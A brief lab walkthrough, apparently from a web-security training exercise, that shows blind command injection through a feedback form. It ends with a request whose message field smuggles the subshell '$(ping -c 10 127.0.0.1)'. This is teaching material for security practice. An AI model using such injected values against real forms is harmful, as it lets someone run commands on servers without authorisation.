Lab is vulnerable to command injection from feedback functionality. 

If you open Firefox Developer Tools before sending out feedback you can see the request you're sending.

Example request would be something like this:

```
csrf	"V5nkxXcAKZ6cWUjHyMQMUHc3J9z9zs5o"
name	"asd"
email	"asd@asd.asd"
subject	"asd"
message	"asd"
```

You can try to inject a ping command to every single parameter.

But we can think a little and deduct that in order to display spaces to message body should be wrapped in quotes and we can inject a command in a subshell like this:

```
csrf	"V5nkxXcAKZ6cWUjHyMQMUHc3J9z9zs5o"
name	"asd"
email	"asd@asd.asd"
subject	"asd"
message	"$(ping -c 10 127.0.0.1)"
```
